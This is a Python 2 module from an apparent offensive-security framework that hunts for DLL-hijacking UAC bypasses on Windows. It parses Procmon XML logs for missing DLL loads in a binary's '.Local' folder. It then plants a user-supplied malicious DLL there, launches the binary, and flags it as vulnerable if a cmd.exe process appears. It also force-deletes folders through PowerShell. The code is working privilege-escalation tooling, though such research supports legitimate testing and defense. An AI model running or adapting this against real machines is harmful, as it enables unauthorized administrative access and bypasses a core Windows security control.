from module import Module
from modules.investigate.procmon_xml_parser import CustomModule as Xml_parser
import time
import subprocess
import psutil


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "DLL discovery",
                       "Description": "This module search in a list of binaries for DLL hijacking UAC bypass",
                       "Author": "Santiago Hernandez Ramos"}

        # -----------name-----default_value--description
        options = {"binary": [None, "Target of the UAC fileless bypass search"],
                   "xml_file": [None, "Path to a procmon like XML file"],
                   "malicious_dll": [None, "Path to a malicious_dll to insert"]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._xml = None
        self._binary = None
        self._results = {"vulnerables": [], "sospechosos": []}
        self.p = None
        self.events = None
        self.events_nf = None
        self._malicious_dll = None

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        # To access user provided attributes, use self.options dictionary
        self._xml = self.options["xml_file"][0]
        self._binary = self.options["binary"][0]
        self._malicious_dll = self.options["malicious_dll"][0]

        self.p = Xml_parser()
        # Initializating the options of the module
        self.p.parse_tree(self._xml)

        self.events = self.p.events()
        self.events_nf = self.p.events_notfound(self.events)

        print "\n[*] Analizing binary: " + str(self._binary)
        nf = self.events_nf_operation()
        paths = self.p.paths(nf)
        for p in paths:
            print p
            if self._binary + ".Local" in p:
                self.handle_dll_local(p, self._binary)

        self.results()

    def handle_dll_local(self, subpath, binary):
        path = subpath + "\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.15063.0_none_583b8639f462029f\\"
        try:
            try:
                subprocess.check_call(
                    ["powershell", "-C", "rm", "-r", "-Force", subpath, "-erroraction", "'silentlycontinue'"])
            except:
                pass

            subprocess.check_call(
                ["powershell", "-C", "mkdir", path])

            subprocess.check_call(
                ["powershell", "-C", "cp", self._malicious_dll, path])

            prev_pids = psutil.pids()
            subprocess.check_call(["powershell", "-C", binary])
            time.sleep(1)
            if self.is_cmd_open():
                if binary not in self._results["vulnerables"]:
                    self._results["vulnerables"].append(binary)
            else:
                if binary not in self._results['sospechosos']:
                    self._results['sospechosos'].append(binary)

            new_pids = psutil.pids()

            self.kill(binary, prev_pids, new_pids)

            subprocess.check_call(
                ["powershell", "-C", "rm", "-r", "-Force", subpath])

            print "deleted"

        except subprocess.CalledProcessError as error:
            print "ERROR: COPYING THE FILE"

    def results(self):
        print "VULNERABLES:"
        for r in self._results["vulnerables"]:
            print r
        print "\nSOSPECHOSOS:"
        for r in self._results["sospechosos"]:
            print r

    def kill(self, proc, last_pids=None, new_pids=None):
        new_pids = self.last_process_created(last_pids, new_pids)
        try:
            for p in new_pids:
                subprocess.check_call(["tskill", str(p)])
        except subprocess.CalledProcessError:
            print "[!!] The process %s can't be killed" % proc
            return

    def last_process_created(self, prev_pids, new_pids):
        pids = []
        for p in new_pids:
            if p not in prev_pids:
                pids.append(p)
        return pids

    def is_cmd_open(self):
        try:
            return 'cmd.exe' in [psutil.Process(p).name() for p in psutil.pids()]
        except:
            pass

    def events_nf_operation(self):
        events_proc = self.p.events_proc_name(self._binary, self.events_nf)
        return self.p.events_operation("CreateFile", events_proc)
